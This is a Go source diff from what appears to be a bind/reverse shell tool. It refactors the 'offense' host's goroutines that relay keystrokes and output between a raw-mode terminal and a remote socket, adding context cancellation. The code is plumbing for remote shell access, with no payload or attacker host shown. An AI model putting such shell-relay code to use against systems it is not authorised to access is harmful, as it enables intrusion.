@@ -35,7 +35,6 @@ func NewHost(peer *conn.Peer) (Host, error) {
 	// Based on the connection type requested by user,
 	// get the socket:
 	var c conn.ConnectionGetter
-	// var host Host
 
 	switch peer.ConnectionType {
 	case "offense":
@@ -45,7 +44,7 @@ func NewHost(peer *conn.Peer) (Host, error) {
 		}
 
 		// We've got the socket, attach it to .... host struct?
-		host := OffensiveHost{socket: socket}
+		host := OffensiveHost{socket: socket, stdin: os.Stdin, stdout: os.Stdout, stderr: os.Stderr}
 		return &host, nil
 	case "connect-back":
 		socket, err := c.GetConnectionFromClient(peer.RPort, peer.Address, peer.Shell)
@@ -54,7 +53,7 @@ func NewHost(peer *conn.Peer) (Host, error) {
 		}
 
 		// Attach socket to new ConnectBackHost struct:
-		host := ConnectBackHost{socket: socket, stdin: os.Stdin, stdout: os.Stdout, stderr: os.Stderr}
+		host := ConnectBackHost{socket: socket}
 		return &host, nil
 	default:
 		return nil, errors.New("Invalid Shell type when attempting to create host.")
@@ -71,7 +70,6 @@ func (off *OffensiveHost) Start(pCtx context.Context) error {
 	defer ioctl.DisableRawMode(int(off.stdin.Fd()), oGTermios)
 
 	// Create child context:
-	// THE CHILDCONTEXT SHOULD BE USE IN THE GO ROUTINE FOR COPYING STDIN TO SOCKET++
 	childContext, chCancel := context.WithCancel(pCtx)
 	defer chCancel()
 
@@ -85,24 +83,29 @@ func (off *OffensiveHost) Start(pCtx context.Context) error {
 		defer chCancel()
 
 		for {
-			// NOTE: NEED TO DECIDE HERE WHAT TO DO IF SOCKET IS CLOSED BY OTHER PEER
-			dataFromSocket, err := off.socket.Read()
-			if len(dataFromSocket) > 0 {
-				// Write data to stdout:
-				_, err = off.stdout.Write(dataFromSocket)
-				if err != nil {
-					fmt.Printf("Error writing data from socket to Offense stdout: %v\n", err)
-					return
-				}
-			}
-
-			if err != nil {
-				if errors.Is(err, io.EOF) {
-					fmt.Printf("Socket closed by other peer\n")
-					return
-				}
-				fmt.Printf("Error reading from socket to Offense stdout: %v\n", err)
+			select {
+			case <-childContext.Done():
+				fmt.Printf("child context done in offense go routine\n")
 				return
+			default:
+				dataFromSocket, err := off.socket.Read()
+				if len(dataFromSocket) > 0 {
+					// Write data to stdout:
+					_, err = off.stdout.Write(dataFromSocket)
+					if err != nil {
+						fmt.Printf("Error writing data from socket to Offense stdout: %v\n", err)
+						return
+					}
+				}
+
+				if err != nil {
+					if errors.Is(err, io.EOF) {
+						fmt.Printf("Socket closed by other peer\n")
+						return
+					}
+					fmt.Printf("Error reading from socket to Offense stdout: %v\n", err)
+					return
+				}
 			}
 		}
 	}()
@@ -116,25 +119,32 @@ func (off *OffensiveHost) Start(pCtx context.Context) error {
 
 		// Read stdin byte by byte
 		for {
-			i, TIT_BY_BOO := off.stdin.Read(buffer)
-			if TIT_BY_BOO != nil {
-				if errors.Is(TIT_BY_BOO, io.EOF) {
-					continue
-				} else {
-					fmt.Printf("Error reading from stdin: %v\n", TIT_BY_BOO)
+			select {
+			case <-childContext.Done():
+				fmt.Printf("Child received done signal, quitting out of offensive start routine\n")
+				return
+			default:
+				i, TIT_BY_BOO := off.stdin.Read(buffer)
+				if TIT_BY_BOO != nil {
+					if errors.Is(TIT_BY_BOO, io.EOF) {
+						continue
+					} else {
+						fmt.Printf("Error reading from stdin: %v\n", TIT_BY_BOO)
+						return
+					}
+				}
+
+				// Write to socket:
+				_, err := off.socket.WriteShit(buffer[:i])
+				if err != nil {
+					fmt.Printf("Error writing Stdin to socket: %v\n", err)
 					return
 				}
-			}
-
-			// Write to socket:
-			_, err := off.socket.WriteShit(buffer[:i])
-			if err != nil {
-				fmt.Printf("Error writing Stdin to socket: %v\n", err)
-				return
 			}
 		}
 	}()
 
+	// Call wait after go routines b/c it's going to block:
 	wg.Wait()
 
 	errno = ioctl.DisableRawMode(int(off.stdin.Fd()), oGTermios)
@@ -161,6 +171,8 @@ func (off *OffensiveHost) Start(pCtx context.Context) error {
 	if err != nil {
 		return errors.New("Error closing stderr on Offense host: " + err.Error())
 	}
+
+	return nil
 }
 
 func (cb *ConnectBackHost) Start(pCtx context.Context) error {
